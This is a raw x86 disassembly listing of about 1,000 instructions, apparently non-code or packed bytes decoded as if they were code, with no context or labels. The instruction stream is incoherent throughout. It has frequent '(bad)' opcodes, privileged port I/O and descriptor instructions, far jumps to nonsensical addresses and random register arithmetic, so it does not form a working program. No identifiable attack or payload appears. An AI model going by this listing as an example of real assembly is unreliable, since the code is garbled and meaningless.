  428be1:	jge    0x428be3
  428be3:	mov    eax,DWORD PTR [ebx]
  428be5:	jb     0x428bef
  428be7:	mov    ecx,DWORD PTR [ebp-0x8]
  428bea:	mov    edi,edi
  428bec:	xor    edx,DWORD PTR [eax]
  428bee:	add    edi,DWORD PTR [ebx]
  428bf0:	mov    DWORD PTR [ebp-0x10],edi
  428bf3:	inc    edi
  428bf4:	pop    ebp
  428bf5:	jge    0x428c32
  428bf7:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428bfb:	mov    edx,0xc05d87f0
  428c00:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c04:	fimul  WORD PTR [eax]
  428c06:	fist   WORD PTR [ebp+0x1c]
  428c09:	in     al,dx
  428c0a:	jne    0x428bf8
  428c0c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c12:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c16:	fdivp  st(0),st
  428c18:	fild   WORD PTR [ebp+0x4510f85c]
  428c1e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c24:	inc    ebp
  428c25:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c2b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c2e:	adc    al,0x8b
  428c30:	rcl    DWORD PTR [eax],0x48
  428c33:	mov    esi,0x7080803
  428c38:	fiadd  WORD PTR [ebp+0x4d]
  428c3b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c41:	cld    
  428c42:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c48:	mov    DWORD PTR [edi+0x872dc],edi
  428c4e:	xlat   BYTE PTR ds:[ebx]
  428c4f:	into   
  428c50:	ffreep st(6)
  428c52:	retf   0x6c7
  428c55:	iret   
  428c56:	dec    ebp
  428c57:	inc    ebp
  428c58:	mov    DWORD PTR [ebx],edi
  428c5a:	fmul   QWORD PTR [edi]
  428c5c:	dec    ebp
  428c5d:	jnp    0x428c92
  428c5f:	add    BYTE PTR [ebx],al
  428c61:	mov    ecx,DWORD PTR [esp+edi*8]
  428c64:	inc    ebp
  428c65:	dec    ebp
  428c66:	lea    esi,[ebx]
  428c68:	add    DWORD PTR [ebx],eax
  428c6a:	jb     0x428ca7
  428c6c:	add    BYTE PTR [edi],cl
  428c6e:	inc    ebp
  428c6f:	imul   eax,edi,0x858bd800
  428c75:	cld    
  428c76:	clc    
  428c77:	mov    DWORD PTR [ebp+0x0],eax
  428c7a:	inc    DWORD PTR [eax]
  428c7c:	or     al,0xde
  428c7e:	sbb    bh,0x1
  428c81:	retf   
  428c82:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428c89:	dec    ebp
  428c8a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428c90:	enter  0x12de,0xdf
  428c94:	inc    ebp
  428c95:	pop    ebp
  428c96:	dec    DWORD PTR [ebx-0x257f0ff4]
  428c9c:	add    DWORD PTR [edx],edx
  428c9e:	add    BYTE PTR [ebp+0x50],dl
  428ca1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428ca7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428cad:	or     ah,al
  428caf:	pop    ss
  428cb0:	cdq    
  428cb1:	push   ebp
  428cb2:	clc    
  428cb3:	mov    eax,DWORD PTR [ebp-0x4]
  428cb6:	xor    edx,edx
  428cb8:	add    esi,DWORD PTR [ebx]
  428cba:	cmp    eax,DWORD PTR [ebx]
  428cbc:	hlt    
  428cbd:	cmp    DWORD PTR [ebx],esp
  428cbf:	or     al,BYTE PTR [ebp+0xf]
  428cc2:	mov    eax,DWORD PTR [edx]
  428cc4:	loopne 0x428cc6
  428cc6:	(bad)  
  428cc7:	mov    ecx,esi
  428cc9:	cld    
  428cca:	pushf  
  428ccb:	pop    ebp
  428ccc:	cwde   
  428ccd:	mov    esi,DWORD PTR [edx]
  428ccf:	lock mov eax,eax
  428cd2:	adc    BYTE PTR [ebx],al
  428cd4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cdb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428ce1:	dec    ebp
  428ce2:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428ce8:	(bad)  
  428ce9:	iret   
  428cea:	inc    ebp
  428ceb:	(bad)  
  428cec:	jne    0x428d3b
  428cee:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428cf4:	(bad)  
  428cf5:	cmp    ebx,eax
  428cf7:	je     0x428c7f
  428cf9:	add    edi,edi
  428cfb:	or     bh,bh
  428cfd:	dec    ebp
  428cfe:	inc    ebp
  428cff:	mov    esi,DWORD PTR [ebx]
  428d01:	cld    
  428d02:	add    ecx,esi
  428d04:	cmp    ecx,DWORD PTR [eax-0xc]
  428d07:	mov    edx,DWORD PTR [edi]
  428d09:	or     BYTE PTR [ebp-0x7c],al
  428d0c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d12:	test   BYTE PTR [eax+ebx*4],cl
  428d15:	inc    ebp
  428d16:	xor    bh,BYTE PTR ds:0x8be89c89
  428d1c:	out    dx,eax
  428d1d:	adc    BYTE PTR [eax],al
  428d1f:	jne    0x428ce8
  428d21:	mov    ebp,esp
  428d23:	fcomp  DWORD PTR [ebx]
  428d25:	add    BYTE PTR [ecx],al
  428d27:	inc    DWORD PTR [ebp-0x75]
  428d2a:	mov    ?,esp
  428d2c:	add    al,0xce
  428d2e:	mov    ecx,edi
  428d30:	cld    
  428d31:	inc    ebp
  428d32:	fidivr WORD PTR [ebx]
  428d34:	fbstp  TBYTE PTR [ebp-0x3e]
  428d37:	mov    eax,DWORD PTR [eax]
  428d39:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d3f:	fadd   st,st(7)
  428d41:	add    BYTE PTR [ebp-0x1],al
  428d44:	mov    ecx,DWORD PTR [esp+edi*8]
  428d47:	inc    ebp
  428d48:	mov    bh,0xc7
  428d4b:	loopne 0x428d92
  428d4d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d53:	add    DWORD PTR [ebx],esi
  428d55:	pushf  
  428d56:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d5c:	mov    eax,edi
  428d5e:	cwde   
  428d5f:	inc    ebp
  428d60:	inc    ebp
  428d61:	jne    0x428cee
  428d63:	mov    esp,esp
  428d65:	clc    
  428d66:	add    al,0x4d
  428d68:	mov    DWORD PTR [ebx],esi
  428d6a:	or     al,0x33
  428d6c:	inc    ebp
  428d6d:	lea    ecx,[ebx-0x398d13fd]
  428d73:	add    bh,al
  428d75:	inc    ebp
  428d76:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d7d:	add    ebp,esp
  428d7f:	shufps xmm1,xmm3,0xc7
  428d83:	(bad)  
  428d84:	jmp    0x7487c8ad
  428d89:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428d8f:	hlt    
  428d90:	mov    ecx,DWORD PTR [edi]
  428d92:	fadd   DWORD PTR [ebp+0x0]
  428d95:	xor    ecx,DWORD PTR [edi]
  428d97:	add    ecx,ecx
  428d99:	cmp    edi,edi
  428d9b:	pmuludq mm7,QWORD PTR [edx+0x50]
  428d9f:	(bad)  
  428da0:	jmp    0x428d2d
  428da2:	mov    edi,esp
  428da4:	or     al,0xc6
  428da6:	inc    ebp
  428da7:	(bad)  
  428da8:	mov    eax,DWORD PTR [ebp+0x10]
  428dab:	jne    0x428d36
  428dad:	mov    eax,DWORD PTR [ecx]
  428daf:	clc    
  428db0:	add    BYTE PTR [ebp-0x40],cl
  428db3:	xor    edx,DWORD PTR [eax-0x73]
  428db6:	jne    0x428db9
  428db8:	push   DWORD PTR [edx+0x8]
  428dbb:	add    BYTE PTR [ebp+0x45],al
  428dbe:	mov    ebp,ecx
  428dc0:	cld    
  428dc1:	add    BYTE PTR [ebp+0x0],cl
  428dc4:	xor    eax,DWORD PTR [ebp+0x3]
  428dc7:	mov    al,0x3b
  428dc9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428dcf:	sub    eax,0x5d330e4d
  428dd4:	lea    esi,[ebx]
  428dd6:	add    DWORD PTR [ebx],eax
  428dd8:	jb     0x428dc3
  428dda:	add    BYTE PTR [eax],al
  428ddc:	inc    ebp
  428ddd:	add    bl,ch
  428ddf:	inc    ebp
  428de0:	mov    esi,DWORD PTR [ebx]
  428de2:	or     al,0x3
  428de4:	(bad)  
  428de5:	mov    edi,eax
  428de7:	in     al,dx
  428de8:	scas   eax,DWORD PTR es:[edi]
  428de9:	inc    ebp
  428dea:	mov    esi,DWORD PTR [ebx]
  428dec:	in     al,0x3
  428dee:	add    al,0x89
  428df0:	mov    ecx,DWORD PTR [eax+edi*8]
  428df3:	dec    ebp
  428df4:	(bad)  
  428df5:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428dfc:	mov    ecx,eax
  428dfe:	cld    
  428dff:	push   es
  428e00:	dec    ebp
  428e01:	add    al,0x33
  428e03:	mov    DWORD PTR [ebx],eax
  428e05:	in     al,dx
  428e06:	cmp    DWORD PTR [ebp-0x67],eax
  428e09:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e0f:	mov    edx,DWORD PTR [ebp-0x4]
  428e12:	mov    ecx,DWORD PTR [ebp-0x18]
  428e15:	xor    ecx,DWORD PTR [ebp+0x3]
  428e18:	cmp    DWORD PTR [ebx],0x8b327497
  428e1e:	xor    edi,esp
  428e20:	jmp    0xff768b72
  428e25:	add    ecx,DWORD PTR [ebp-0x3f]
  428e28:	xor    ebx,DWORD PTR [edi]
  428e2a:	add    eax,ecx
  428e2c:	cmp    ebx,DWORD PTR [eax]
  428e2e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e31:	mov    ecx,DWORD PTR [eax]
  428e33:	adc    BYTE PTR [ebp-0x80],al
  428e36:	jmp    0x428e39
  428e38:	mov    eax,DWORD PTR [eax]
  428e3a:	cld    
  428e3b:	mov    bh,0xc6
  428e3d:	push   ecx
  428e3e:	(bad)  
  428e3f:	jne    0x428e9f
  428e41:	dec    ecx
  428e43:	or     BYTE PTR [ecx+ebx*1],cl
  428e46:	push   ebp
  428e47:	inc    ebp
  428e48:	in     al,dx
  428e49:	add    ebp,esp
  428e4b:	or     bh,al
  428e4d:	dec    ebp
  428e4e:	cld    
  428e4f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e55:	cmp    DWORD PTR [ecx],0x2
  428e58:	pushf  
  428e59:	dec    DWORD PTR [ebx+0x45510cf4]
  428e5f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e65:	mov    edx,DWORD PTR [ecx+0xc]
  428e68:	xor    eax,esi
  428e6a:	mov    edx,0xc172c7
  428e6f:	inc    ebp
  428e70:	mov    esi,DWORD PTR [ebp+0x8]
  428e73:	mov    eax,edx
  428e75:	call   0x84c7556a
  428e7a:	add    DWORD PTR [eax-0x76bace00],ebx
  428e80:	mov    ebp,eax
  428e82:	or     BYTE PTR [eax],dl
  428e84:	jo     0x428ed3
  428e86:	push   edi
  428e87:	xor    esi,DWORD PTR [ebp+0x3]
  428e8a:	(bad)  
  428e8b:	pmulhuw mm0,mm1
  428e8e:	test   DWORD PTR [ebp-0x8],ecx
  428e91:	mov    DWORD PTR [ebp-0x67],eax
  428e94:	mov    eax,DWORD PTR [ebp-0x4]
  428e97:	xor    edi,DWORD PTR [ebp-0x73]
  428e9a:	xor    eax,DWORD PTR [ebx]
  428e9c:	xor    esi,DWORD PTR [edx+0x3]
  428e9f:	add    BYTE PTR [ecx],bh
  428ea1:	inc    ebp
  428ea2:	(bad)  
  428ea3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ea9:	mov    DWORD PTR [eax],0x750f0004
  428eaf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428eb5:	lock add BYTE PTR [ebp+0x0],al
  428eb9:	mov    esi,DWORD PTR [ebp-0x2c]
  428ebc:	mov    ebp,edx
  428ebe:	or     al,0x72
  428ec0:	ja     0x428ec2
  428ec2:	mov    edx,esi
  428ec4:	cld    
  428ec5:	(bad)  
  428ec8:	cli    
  428ec9:	mov    esi,DWORD PTR [ebp-0x4]
  428ecc:	cmp    ecx,esi
  428ece:	bswap  edi
  428ed0:	(bad)
  428ed4:	mov    esi,DWORD PTR [ebp-0x4]
  428ed7:	mov    esi,ecx
  428ed9:	clc    
  428eda:	repnz add esi,DWORD PTR [ebp+0x45]
  428ede:	push   ebx
  428edf:	xor    eax,DWORD PTR [ebp+0x3]
  428ee2:	cmp    ebx,DWORD PTR [edi-0x64]
  428ee5:	pop    ebx
  428ee6:	jmp    0x428fad
  428eeb:	mov    esi,DWORD PTR [ebp-0x7d]
  428eee:	xor    ebp,DWORD PTR [eax]
  428ef0:	lea    eax,[ebp-0x8]
  428ef3:	cmp    dl,dh
  428ef5:	pushf  
  428ef6:	out    dx,eax
  428ef7:	(bad)  
  428ef8:	neg    eax
  428efa:	ins    DWORD PTR es:[edi],dx
  428efb:	test   esi,edi
  428efd:	clc    
  428efe:	pop    esp
  428eff:	inc    ebp
  428f00:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f06:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f0c:	add    cl,al
  428f0e:	jne    0x428ea8
  428f10:	mov    esi,DWORD PTR [edx]
  428f12:	in     al,dx
  428f13:	push   esi
  428f14:	xor    BYTE PTR [ebp-0xe],dh
  428f17:	add    edi,esi
  428f19:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f1f:	add    cl,bh
  428f21:	mov    edi,DWORD PTR [ebp+0x8]
  428f24:	mov    DWORD PTR [ebp-0x14],esi
  428f27:	add    esi,DWORD PTR [ebp+0x3c]
  428f2a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f30:	mov    ah,0x3d
  428f32:	cwde   
  428f33:	pushf  
  428f34:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f3a:	jne    0x428ec7
  428f3c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f3f:	icebp  
  428f40:	icebp  
  428f41:	shl    edx,0xf2
  428f44:	(bad)  
  428f45:	mov    ah,0x16
  428f47:	cmp    BYTE PTR [ebp-0x6d],dh
  428f4a:	mov    ecx,DWORD PTR [edi]
  428f4c:	in     al,dx
  428f4d:	jmp    0x428f40
  428f4f:	add    dl,dh
  428f51:	mov    edi,esi
  428f53:	or     al,0x8
  428f55:	inc    ebp
  428f56:	jne    0x428f5b
  428f58:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f5e:	ret    
  428f5f:	or     bh,bh
  428f61:	jge    0x428f4b
  428f63:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f69:	xor    edi,eax
  428f6b:	add    esi,DWORD PTR [ebp-0x77]
  428f6e:	mov    ebx,esp
  428f70:	clc    
  428f71:	neg    DWORD PTR [ebp-0x7c]
  428f74:	xor    eax,DWORD PTR [eax]
  428f76:	cmp    eax,DWORD PTR [eax]
  428f78:	repz jne 0x428f10
  428f7b:	xor    eax,DWORD PTR [ecx]
  428f7d:	add    ebx,DWORD PTR [eax]
  428f7f:	mov    DWORD PTR [ebp-0x8],eax
  428f82:	mov    eax,edi
  428f84:	cld    
  428f85:	lock pop eax
  428f87:	test   DWORD PTR [ebx],esi
  428f89:	clc    
  428f8a:	add    edx,DWORD PTR [edi-0x740bff77]
  428f90:	fdivp  st(4),st
  428f92:	test   ecx,esi
  428f94:	(bad)  
  428f95:	jnp    0x428f96
  428f97:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428f9d:	jae    0x428f2a
  428f9f:	sub    edi,esp
  428fa1:	(bad)  
  428fa2:	shl    DWORD PTR [eax-0x3e],0x89
  428fa6:	leave  
  428fa7:	call   0x819846b4
  428fac:	in     al,dx
  428fad:	(bad)  
  428fae:	in     al,dx
  428faf:	add    bh,al
  428fb1:	mov    esp,edi
  428fb3:	in     al,dx
  428fb4:	test   DWORD PTR [ebp-0x8],edi
  428fb7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fba:	cmp    DWORD PTR [ebx],eax
  428fbc:	pushf  
  428fbd:	jnp    0x57318bf6
  428fc3:	xor    edx,DWORD PTR [eax-0x77]
  428fc6:	push   ecx
  428fc7:	loopne 0x428ffc
  428fc9:	jne    0x428f86
  428fcb:	mov    esi,DWORD PTR [edx-0x20]
  428fce:	add    BYTE PTR [ebp-0x3d],bh
  428fd1:	xor    eax,DWORD PTR [ebp-0x73]
  428fd4:	mov    edi,DWORD PTR [esi]
  428fd6:	cld    
  428fd7:	jb     0x428f9f
  428fd9:	add    bl,al
  428fdb:	jne    0x429022
  428fdd:	mov    edx,DWORD PTR [edi-0x10]
  428fe0:	jge    0x42905f
  428fe2:	mov    esi,DWORD PTR [ebx]
  428fe4:	lock add ecx,DWORD PTR [ebp+0x3b]
  428fe8:	xor    esi,DWORD PTR [ebp-0x77]
  428feb:	mov    esi,eax
  428fed:	lock inc ebp
  428fef:	jge    0x429029
  428ff1:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428ff8:	dec    ebp
  428ff9:	mov    esi,DWORD PTR [ebx]
  428ffb:	loopne 0x428f86
  428ffd:	jge    0x428ff7
  428fff:	add    DWORD PTR [ebp-0x7d],eax
  429002:	clc    
  429003:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42900a:	dec    ebp
  42900b:	hlt    
  42900c:	xor    ebx,DWORD PTR [ebp-0x77]
  42900f:	mov    esi,esp
  429011:	in     al,0x45
  429013:	jge    0x429051
  429015:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42901c:	dec    ebp
  42901d:	cmp    al,0x33
  42901f:	xchg   ebx,eax
  429020:	mov    DWORD PTR [ebx-0x14],esi
  429023:	add    eax,DWORD PTR [ebp-0xc]
  429026:	cmp    BYTE PTR [ebp-0x61],dh
  429029:	mov    edi,DWORD PTR [eax+0xf19504]
  42902f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429033:	cmp    eax,DWORD PTR [ebp+0xf]
  429036:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42903a:	fistp  WORD PTR [ebx+0x0]
  42903d:	inc    ebp
  42903e:	mov    ebx,DWORD PTR [edi+0xc]
  429041:	add    eax,eax
  429043:	inc    ebp
  429044:	test   BYTE PTR [ebx],dh
  429046:	add    eax,DWORD PTR [ebx]
  429048:	add    BYTE PTR [esi+0x45],bl
  42904b:	ret    0x85
  42904e:	jnp    0x5443141d
  429054:	inc    bp
  429056:	inc    ebp
  429057:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42905d:	fdiv   QWORD PTR [ebx]
  42905f:	test   DWORD PTR [ecx+0x453af8],edi
  429065:	push   ebx
  429066:	add    edi,DWORD PTR [esi+0x708088b]
  42906c:	cmp    esi,eax
  42906e:	sets   BYTE PTR [ecx-0x74fcffce]
  429075:	mov    esp,edi
  429077:	call   0x33cdd5c9
  42907c:	or     BYTE PTR [ebx],al
  42907e:	inc    ecx
  42907f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  429085:	and    BYTE PTR [ebp-0x7074f0bb],al
  42908b:	lock add cl,al
  42908e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  429095:	mov    ch,0x45
  429097:	clc    
  429098:	xor    eax,DWORD PTR [ebp+0x3]
  42909b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290a1:	inc    ebp
  4290a2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290a8:	mov    edi,eax
  4290aa:	mov    eax,DWORD PTR [ebp+0x3c]
  4290ad:	mov    ecx,DWORD PTR [eax]
  4290af:	hlt    
  4290b0:	inc    ebp
  4290b1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290b8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290be:	push   ebp
  4290bf:	mov    edi,DWORD PTR [ebx]
  4290c1:	in     al,dx
  4290c2:	jne    0x429085
  4290c4:	mov    eax,DWORD PTR [ebp-0x28]
  4290c7:	add    DWORD PTR [eax],0xe8058dec
  4290cd:	clc    
  4290ce:	mov    esp,DWORD PTR [edi-0x8]
  4290d1:	add    dh,dl
  4290d3:	rol    WORD PTR [ebp-0x1],cl
  4290d7:	mov    edx,DWORD PTR [eax+0x8]
  4290da:	jne    0x42909c
  4290dc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4290e3:	inc    ebp
  4290e4:	push   esp
  4290e5:	test   DWORD PTR [ecx+0xf],ecx
  4290e8:	sub    edx,esp
  4290ea:	add    eax,DWORD PTR [eax]
  4290ec:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4290f2:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4290f9:	mov    eax,DWORD PTR [ecx]
  4290fb:	and    BYTE PTR [eax],al
  4290fd:	adc    BYTE PTR ss:[eax],al
  429100:	inc    ebp
  429101:	inc    cx
  429104:	push   esp
  429105:	cld    
  429106:	jne    0x429108
  429108:	push   edx
  429109:	enterw 0xc1,0x4d
  42910e:	mov    esp,DWORD PTR [esi+0x20]
  429111:	add    DWORD PTR [ecx-0x7b],eax
  429114:	add    eax,DWORD PTR [ebx]
  429116:	str    WORD PTR [eax+0x45]
  42911a:	lea    ecx,[ebx+0x45890801]
  429120:	sbb    BYTE PTR [ebx],al
  429122:	dec    ebp
  429123:	cmp    al,0xf
  429125:	inc    ebp
  429126:	push   eax
  429127:	mov    esi,DWORD PTR [ebx]
  429129:	push   eax
  42912a:	add    eax,eax
  42912c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429133:	inc    ebp
  429134:	add    BYTE PTR [eax],bh
  429136:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42913d:	(bad)  
  42913e:	mov    ebx,eax
  429140:	loopne 0x429187
  429142:	dec    ebp
  429143:	mov    ecx,DWORD PTR [edi]
  429145:	cld    
  429146:	push   eax
  429147:	xchg   DWORD PTR [ebx],esi
  429149:	add    DWORD PTR [ebx],ebp
  42914b:	add    BYTE PTR [ebx],ch
  42914d:	or     BYTE PTR [ecx],bh
  42914f:	dec    ecx
  429150:	loopne 0x429155
  429152:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429158:	push   ebp
  429159:	add    DWORD PTR [ebx+0x55100800],eax
  42915f:	dec    ebp
  429160:	jmp    0x4290eb
  429162:	mov    esp,DWORD PTR [eax]
  429164:	sbb    dl,dl
  429166:	inc    eax
  429167:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42916d:	add    BYTE PTR [ebx+0x74528555],cl
  429173:	push   ebp
  429174:	div    DWORD PTR [ebx]
  429176:	and    eax,DWORD PTR [ebx]
  429178:	add    edx,DWORD PTR [edx-0x30]
  42917b:	jno    0x429108
  42917d:	inc    DWORD PTR [eax+eiz*1]
  429180:	inc    ebp
  429181:	push   eax
  429182:	push   eax
  429183:	mov    esp,DWORD PTR [edi-0x74beff1c]
  429189:	mov    edi,esp
  42918b:	push   eax
  42918c:	inc    ebp
  42918d:	enter  0x458b,0x8
  429191:	push   ecx
  429192:	(bad)  
  429193:	call   0x10c9b6b
  429198:	pop    ss
  429199:	push   ebp
  42919a:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291a0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291a6:	push   ecx
  4291a7:	jo     0x429191
  4291a9:	inc    DWORD PTR [edi]
  4291ab:	or     BYTE PTR [eax],al
  4291ad:	call   0xcd98f7
  4291b2:	fmul   QWORD PTR [ebp+0x55]
  4291b5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291bb:	mov    bh,0x8c
  4291bd:	adc    al,0x98
  4291bf:	dec    esp
  4291c0:	xor    bl,BYTE PTR [eax]
  4291c2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291c5:	mov    eax,DWORD PTR [ebp-0x4]
  4291c8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ce:	push   es
  4291cf:	retf   
  4291d0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291d4:	inc    ebp
  4291d5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291dc:	retf   0x83fc
  4291df:	into   
  4291e0:	dec    ebp
  4291e1:	retf   
  4291e2:	mov    ecx,DWORD PTR [ebp-0x74]
  4291e5:	mov    eax,DWORD PTR [eax]
  4291e7:	fdiv   QWORD PTR [ebx]
  4291e9:	mov    bh,0x3
  4291eb:	push   es
  4291ec:	mov    esi,ecx
  4291ee:	sbb    cl,dl
  4291f0:	dec    ebp
  4291f1:	sar    DWORD PTR [ebx],cl
  4291f3:	push   ebp
  4291f4:	jne    0x429205
  4291f6:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4291fc:	lea    ebx,[eax]
  4291fe:	call   0xf4cc1dc5
  429203:	sbb    dh,dl
  429205:	add    edx,ebx
  429207:	push   ebp
  429208:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42920e:	push   ecx
  42920f:	mov    DWORD PTR [eax-0x30],edx
  429212:	test   DWORD PTR [edx],eax
  429214:	xadd   esp,esi
  429217:	pop    es
  429218:	add    cl,dl
  42921a:	mov    eax,ecx
  42921c:	or     al,0x45
  42921e:	(bad)  
  42921f:	push   eax
  429220:	add    DWORD PTR [edx+0x0],eax
  429223:	add    ecx,DWORD PTR [ecx]
  429225:	and    dh,cl
  429227:	call   0xc69af7
  42922c:	add    DWORD PTR [ebp+0x0],edx
  42922f:	mov    esp,DWORD PTR [ebp+0x18]
  429232:	add    BYTE PTR [eax+0x44],cl
  429235:	xor    eax,DWORD PTR [eax]
  429237:	add    esp,DWORD PTR [esi+0x3b]
  42923a:	inc    ebp
  42923b:	je     0x4291c0
  42923d:	push   ecx
  42923e:	or     cl,BYTE PTR [ebp-0x77]
  429241:	add    eax,esi
  429243:	or     al,0x5e
  429245:	inc    eax
  429246:	add    BYTE PTR [ebx],al
  429248:	data16 and BYTE PTR [ebp+0x50],al
  42924c:	sub    DWORD PTR [ecx],0xffffffe8
  42924f:	add    BYTE PTR [ebp-0x75],ah
  429252:	add    BYTE PTR [eax],bl
  429254:	enter  0x894d,0x8b
  429258:	int3   
  429259:	loopne 0x42928d
  42925b:	rol    BYTE PTR [eax],0x33
  42925e:	lea    cx,[ebp+0xa]
  429262:	data16 jb 0x4292aa
  429265:	add    BYTE PTR [ebx+0x44890855],cl
  42926b:	sbb    ah,al
  42926d:	inc    ebp
  42926e:	lldt   WORD PTR ss:[edx+0x66]
  429273:	xor    ecx,DWORD PTR [eax]
  429275:	sub    edi,esp
  429277:	mov    eax,DWORD PTR [eax]
  429279:	or     al,0x66
  42927b:	ror    edx,cl
  42927d:	dec    ebp
  42927e:	inc    ebp
  42927f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  429285:	cld    
  429286:	or     BYTE PTR [edi+0x4501dd],dl
  42928c:	(bad)  
  42928d:	into   
  42928e:	out    dx,al
  42928f:	retf   
  429290:	(bad)  
  429291:	dec    ebp
  429292:	mov    al,0x8b
  429294:	jmp    0xea27:0x450ac320
  42929b:	xchg   esi,ebp
  42929d:	add    edi,eax
  42929f:	add    BYTE PTR [eax+0x3f52e955],bh
  4292a5:	push   ebp
  4292a6:	inc    ebp
  4292a7:	xor    ebx,esp
  4292a9:	add    ebp,esi
  4292ab:	push   edx
  4292ac:	push   bp
  4292ae:	inc    ebp
  4292af:	(bad)  
  4292b0:	in     eax,dx
  4292b1:	push   esp
  4292b2:	(bad)  
  4292b3:	inc    edx
  4292b5:	sbb    al,0x33
  4292b7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292be:	add    BYTE PTR [ebp+0x43],0x8b
  4292c2:	jmp    0xf98b:0x100041c8
  4292c9:	xor    esi,DWORD PTR [edx+0x3]
  4292cc:	mov    ecx,DWORD PTR [edi]
  4292ce:	fmul   DWORD PTR [edx]
  4292d0:	add    BYTE PTR [eax],al
  4292d2:	lea    eax,[ebx-0x4700273c]
  4292d8:	add    al,0x4f
  4292da:	pop    DWORD PTR [eax]
  4292dc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4292e2:	push   edx
  4292e3:	inc    WORD PTR [ebp+0x8]
  4292e7:	mov    eax,0x514f4d
  4292ec:	(bad)
  4292f0:	add    al,al
  4292f2:	xor    DWORD PTR [ebx-0x74baf730],eax
  4292f8:	test   DWORD PTR [esi+0x74],esp
  4292fb:	inc    ebp
  4292fc:	mov    DWORD PTR [eax+0xa4f08],edi
  429302:	add    BYTE PTR [ecx-0x76c435bb],cl
  429308:	or     dh,cl
  42930a:	or     eax,0x8b8d5045
  42930f:	inc    ebp
  429310:	mov    WORD PTR [ecx+0x3b8a00],?
  429316:	jne    0x42934b
  429318:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42931e:	add    DWORD PTR [ebx],eax
  429320:	add    bh,bh
  429322:	adc    DWORD PTR [eax],ecx
  429324:	adc    DWORD PTR [ebp+0x55],edi
  429327:	push   es
  429328:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42932e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429335:	inc    ebp
  429336:	mov    esp,edi
  429338:	or     al,0xdc
  42933a:	push   eax
  42933b:	(bad)  
  42933c:	jne    0x4292f2
  42933e:	call   0x3a8c2f
  429343:	inc    ebp
  429344:	rol    dl,0x84
  429347:	out    dx,al
  429348:	add    bh,al
  42934a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429351:	(bad)  
  429352:	and    al,al
  429354:	fs in  eax,dx
  429356:	inc    DWORD PTR [ebp-0x7b]
  429359:	js     0x42936a
  42935b:	leave  
  42935c:	scas   al,BYTE PTR es:[edi]
  42935d:	inc    esp
  42935e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
